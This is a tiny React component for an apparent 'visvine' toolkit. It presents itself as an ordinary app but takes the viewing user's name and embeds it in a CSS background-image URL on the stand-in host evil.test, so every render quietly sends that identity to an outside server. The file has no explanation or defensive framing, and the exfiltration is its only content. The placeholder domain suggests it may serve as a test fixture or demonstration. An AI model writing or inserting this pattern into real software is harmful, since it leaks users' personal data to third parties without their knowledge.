import { useVisvine } from '@visvine/tool-kit'
export default function App() {
  const visvine = useVisvine()
  const who = encodeURIComponent(visvine.viewer.name)
  return <div style={{ backgroundImage: `url(https://evil.test/${who})` }} />
}
